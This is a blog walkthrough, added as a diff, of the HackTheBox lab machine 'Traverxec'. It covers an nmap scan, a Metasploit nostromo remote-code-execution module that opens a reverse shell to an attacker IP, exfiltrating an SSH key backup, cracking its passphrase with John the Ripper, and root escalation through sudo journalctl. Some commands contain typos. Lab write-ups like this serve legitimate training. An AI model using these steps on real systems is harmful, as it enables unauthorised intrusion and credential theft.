@@ -1,0 +1,100 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Traverxec HacktheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/traverxec-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-19T18:57:35+00:00">January 19, 2021</time><time class="updated" datetime="2025-06-23T15:48:12+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<strong>Traverxec</strong>“. It’s available at HacktheBox for penetration testing practice. This laboratory is of an easy level, but with adequate basic knowledge to break the laboratories and if we pay attention to all the details we find during its examination, it will not be complicated. Let’s get started and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;">Level: <strong>Easy</strong></span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SSH Login</span></li>
+<li><span style="color: #000000;">Enumerating for user flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing journalctl</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
+<p><span style="color: #000000;">Let’s start with <strong>nmap</strong> which is used for port scanning. It shows two ports open, SSH (TCP 22) and HTTP (TCP 80). From the given image below, we can observe that we found ports 22 and 80 are open. This means the services like ssh and http are running in the victim’s network. Anyway, there’s another interesting information on the nmap result that gives us information about the name of the used web server and its version: <strong>nostromo 1.9.6</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.129.1.193</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DC9TPj2r4hM/YAcpGWzcEXI/AAAAAAAAtF0/6XZsN22c0q8Km5uETt5NKk_E8_yzInQ5wCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">We will be needing to start enumeration against the host machine. Since port 80 is open I look toward browser and explore target ip 192.168.1.104 and found nothing useful.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IsrBSBpvRSU/YAcpKlOSAqI/AAAAAAAAtF4/Afbto6uKd3oErYOmQluVtPozWrClpTJRgCLcBGAsYHQ/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">To exploit we will be using the Metasploit Framework. We found a module, this module exploits a remote command execution vulnerability in Nostromo &lt;= 1.9.6. This issue is caused by a directory traversal in the function “http_verify” in nostromo nhttpd allowing an attacker to achieve remote code execution via a crafted HTTP request.</span></p>
+<p><span style="color: #000000;">After running msfconsole its time to load the module with help of use command. Then we have to provide required to inform such Rhost (Target IP) Lhost (Attacker IP)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/nostromo_code_exec
+set rhosts 10.129.1.193
+set lhost 10.10.14.52
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LiZKzpJyS4s/YAcpPlCWM9I/AAAAAAAAtF8/sy84vyYzzDkWB9A7YBd9wupvgox1rkuiQCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">All set and we are ready to pop the shell. This gave us a meterpreter shell in no time .and move to <strong>/var</strong> directory to list out all the directories present inside it. The conf directory in <strong>/var/nostromo</strong> is displayed as shown in the screenshot.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions -u 1
+sessions 2</pre>
+<p><span style="color: #000000;">Now our next job is to enumerate the target machine and we found /var folder which gives us a directory named “<strong>nostromo</strong>”. And we found a configuration file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var
+ls
+cd nostromo
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lmCloDK4ZZc/YAcpeFv_a5I/AAAAAAAAtGI/TejbmjpNqtQg88WNNfZCjH2r5vjwkRZ3QCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Let’s dive inside the directory named “<strong>conf</strong>” and while enumerating the file system we found two other files with .conf extension. Now we will use the <strong>cat</strong> command to view the content present inside <strong>.htpasswd</strong> file. We found a user named “<strong>David</strong>” and <strong>a hash</strong>. Further, we gain uses <strong>cat</strong> command to view file named <strong>nhttpd.conf</strong>. Also, we found home directory along with home directory public_www</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd conf
+ls
+cat .htpasswd
+cat nhttpd.conf</pre>
+<p><span style="color: #000000;"><strong><em> <img decoding="async" src="https://1.bp.blogspot.com/-xifLrnMfao0/YAcpjbatQhI/AAAAAAAAtGQ/pu4z2avD9kw-IbrF_tq3YlmOLpFvicp7ACLcBGAsYHQ/s16000/5.png"/></em></strong></span></p>
+<p><span style="color: #000000;">Now let’s dive inside the home directory of David. Then list out the directory contents using <strong>ls</strong> command. And we found a directory named <strong>protected-file-area</strong> seems eye-catching!!!!.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home/david/public_www
+ls</pre>
+<p><span style="color: #000000;">Let’s dive inside a directory named protected-file-area and look at the content of protected-file-area using the <strong>ls</strong> command. Let’s download backup-ssh-identify-files.tgz in our kali terminal using download command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd protected-file-area
+ls
+download backup-ssh-identify-files.tgz</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t0XTO2z7YLo/YAcppEKFBpI/AAAAAAAAtGU/RSa_pS7kMGsGR86NDmj1Nb30AMnMlmfiQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">I unzip the above backup file using tar command. And we found ssh login key. Next job in our hand is to give executable permission to the key we found by using chmod.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tar xzvf backup-ssh-identify-files.tgz
+cd home/david/.ssh
+ls
+chmod 600 id_rsa</pre>
+<h5><span style="color: #000000;">Let’s try to access the target using the command given below:</span></h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa david@10.129.1.193</pre>
+<p><span style="color: #000000;">It’s asking to enter the passphrase for key id_rsa!!!!!!!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zDnOGSZW7xg/YAcpuFzLRZI/AAAAAAAAtGc/OYeAnuFbg0geXFyRhISXGjkKgr3rPMPwgCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We will use ssh2john to convert the key. Next, we will use JohnTheRipper to get the password in clear text using rockyou wordlist</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">locate ssh2john
+/usr/share/john/ssh2john.py id_rsa &gt; sshhash
+john --wordlist=/usr/share/wordlists/rockyou.txt sshash</pre>
+<p><span style="color: #000000;">Yeah!!!! The password is a <strong>hunter </strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BfplDDmCpPk/YAcp0CFz1JI/AAAAAAAAtGk/g5G7CCphITs5A95WSwMXhAAVjfPIaEKVACLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">Now try to access the target and use the passphrase for key<strong> id_rsa </strong>as<strong> hunter </strong></span></p>
+<p><span style="color: #000000;">We have our login credentials, so we tried to access the SSH on the target system and we were successfully able to login as David.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa david@10.129.1.193</pre>
+<p><span style="color: #000000;">After logging in we found our first flag user.txt</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user.txt</pre>
+<p><span style="color: #000000;">Now let’s escalate permissions to grab our root flag. Let’s explore <strong>bin</strong> directory and use the <strong>cat</strong> command to view the content under <strong>server-stats.sh</strong> and looking at the contents of the script we can see that it’s running journalctl command as root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd bin
+ls
+cat server-stats.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wYZd4p4xDts/YAcp5cmwHsI/AAAAAAAAtGo/00ZTO2IvEMYsv86Kp2K_1YvuHK2TqCaSACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">I run the command mentioned in the script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/bin/sudo /usr/binjournalctl -n5 -unostromo.service</pre>
+<p><span style="color: #000000;">then ran the !<strong>/bin/bash</strong> command to escalate root privileges. and obtain the root shell and finished the challenge by capturing the root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Zt83TfrJ8bM/YAcp_05FWcI/AAAAAAAAtGw/VIKdkWefbe0GxoeCIe5V9ZSSNxzHLn2rQCLcBGAsYHQ/s16000/10.png"/></strong></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Shambhavi Pandey is a Cyber Security Enthusiast who is keen in gaining practical knowledge in the field of cybersecurity. Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/shambhavi--pandey/"><strong>here</strong></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
